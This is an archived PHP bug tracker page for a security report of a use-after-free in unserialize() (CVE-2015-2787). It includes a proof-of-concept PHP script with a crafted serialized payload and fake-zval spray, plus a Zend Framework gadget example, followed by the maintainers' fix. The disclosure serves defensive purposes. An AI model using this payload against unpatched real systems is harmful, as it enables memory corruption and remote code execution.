@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #68976 - RDF' href='rss/bug.php?id=68976'>
+        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #68976 - RSS 2.0' href='rss/bug.php?id=68976&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #68976 :: Use After Free Vulnerability in unserialize()</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=68976">Sec Bug</a>&nbsp;#68976</th>
+            <td id="summary" colspan="5">Use After Free Vulnerability in unserialize()</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2015-02-03 06:18 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2015-03-31 05:51 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=%2AGeneral+Issues">*General Issues</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.6.5</td>
+            <th class="details">OS:</th>
+            <td>*</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2787" target="_blank">2015-2787</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=68976&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=68976&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=68976&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1422944332">&nbsp;</a><strong>[2015-02-03 06:18 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+static inline int object_common2(UNSERIALIZE_PARAMETER, zend_long elements)
+{
+	zval retval;
+	zval fname;
+
+	if (Z_TYPE_P(rval) != IS_OBJECT) {
+		return 0;
+	}
+
+	//??? TODO: resize before
+	if (!process_nested_data(UNSERIALIZE_PASSTHRU, Z_OBJPROP_P(rval), elements, 1)) {
+		return 0;
+	}
+
+	ZVAL_DEREF(rval);
+	if (Z_OBJCE_P(rval) != PHP_IC_ENTRY &amp;&amp;
+		zend_hash_str_exists(&amp;Z_OBJCE_P(rval)-&gt;function_table, &quot;__wakeup&quot;, sizeof(&quot;__wakeup&quot;)-1)) {
+		ZVAL_STRINGL(&amp;fname, &quot;__wakeup&quot;, sizeof(&quot;__wakeup&quot;) - 1);
+		BG(serialize_lock)++;
+		call_user_function_ex(CG(function_table), rval, &amp;fname, &amp;retval, 0, 0, 1, NULL);
+
+The __wakeup() magic method lead to this problem.
+
+The simple code:
+
+&lt;?php
+
+class evilClass {
+	public $name;
+	function __wakeup() {
+		unset($this-&gt;name);
+	}
+}
+
+$fakezval = pack(
+    'IIII',
+    0x00100000,
+    0x00000400,
+    0x00000000,
+    0x00000006 
+);
+
+$data = unserialize('a:2:{i:0;O:9:&quot;evilClass&quot;:1:{s:4:&quot;name&quot;;a:2:{i:0;i:1;i:1;i:2;}}i:1;R:4;}');
+
+for($i = 0; $i &lt; 5; $i++) {
+    $v[$i] = $fakezval.$i;
+}
+
+var_dump($data);
+
+?&gt;
+
+The unset() leads to the ZVAL and all its children is freed from memory. However the unserialize() code will still allow to use R: or r: to set references to that already freed memory. There is a use after free vulnerability, and allows to execute arbitrary code.
+
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=68976'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=68976'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1424065175">&nbsp;</a><strong>[2015-02-16 05:39 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>This requires creating special class to trigger this. But if you can inject code in evilClass, you already have code execution capability. So I'm not sure this is a security issue. I'll think if this issue can be fixed, but doesn't look like a security problem.
+</pre>
+</div><div class='comment type_comment' ><a name="1424070295">&nbsp;</a><strong>[2015-02-16 07:04 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>In fact, many programs use __wakeup(), and don't need a special definition of __wakeup(), some very common operations can cause problems, like Zend Framework 2
+
+class Mbox extends AbstractStorage
+{
+...
+    protected function openMboxFile($filename)
+    {
+        if ($this-&gt;fh) {
+            $this-&gt;close();
+        }
+        ErrorHandler::start();
+        $this-&gt;fh = fopen($filename, 'r');
+        $error = ErrorHandler::stop();
+        if (!$this-&gt;fh) {
+            throw new Exception\RuntimeException('cannot open mbox file', 0, $error);
+        }
+        $this-&gt;filename = $filename;
+        $this-&gt;filemtime = filemtime($this-&gt;filename);
+...
+    public function close()
+    {
+        ErrorHandler::start(E_WARNING);
+        fclose($this-&gt;fh);
+        ErrorHandler::stop();
+        $this-&gt;positions = array();
+    }
+...
+    public function __wakeup()
+    {
+        ErrorHandler::start();
+        $filemtime = filemtime($this-&gt;filename);
+        ErrorHandler::stop();
+        if ($this-&gt;filemtime != $filemtime) {
+            $this-&gt;close();
+            $this-&gt;openMboxFile($this-&gt;filename);
+        } else {
+            ErrorHandler::start();
+            $this-&gt;fh = fopen($this-&gt;filename, 'r');
+            $error    = ErrorHandler::stop();
+            if (!$this-&gt;fh) {
+                throw new Exception\RuntimeException('cannot open mbox file', 0, $error);
+            }
+        }
+    }
+
+$this-&gt;positions, $this-&gt;filemtime and etc will be assigned, which leads to use after free vulnerability and remote code execution.
+</pre>
+</div><div class='comment type_comment' ><a name="1425275867">&nbsp;</a><strong>[2015-03-02 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>This seems to fix the issue: <a href="https://gist.github.com/smalyshev/eea9eafc7c88a4a6d10d" rel="nofollow">https://gist.github.com/smalyshev/eea9eafc7c88a4a6d10d</a>
+
+Please check.
+</pre>
+</div><div class='comment type_comment' ><a name="1425283759">&nbsp;</a><strong>[2015-03-02 08:09 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>The patch looks and test is ok.
+</pre>
+</div><div class='comment type_log' ><a name="1426635855">&nbsp;</a><strong>[2015-03-17 23:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status:      Open</span>
+<span class="added">+Status:      Closed</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_comment' ><a name="1426635855">&nbsp;</a><strong>[2015-03-17 23:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>The fix for this bug has been committed.
+
+Snapshots of the sources are packaged every three hours; this change
+will be in the next snapshot. You can grab the snapshot at
+<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.
+
+ For Windows:
+
+<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
+ 
+Thank you for the report, and for helping us make PHP better.
+
+
+</pre>
+</div><div class='comment type_log' ><a name="1427781067">&nbsp;</a><strong>[2015-03-31 05:51 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2015-2787</span>
+</div></div></div><div class='comment type_svn' ><a name="1469014754">&nbsp;</a><strong>[2016-07-20 11:39 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=780222f97f47644a6a118ada86a269a96a1e8134" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=780222f97f47644a6a118ada86a269a96a1e8134</a>
+Log: Fixed <a href='bug.php?id=68976'>bug #68976</a> - Use After Free Vulnerability in unserialize()
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
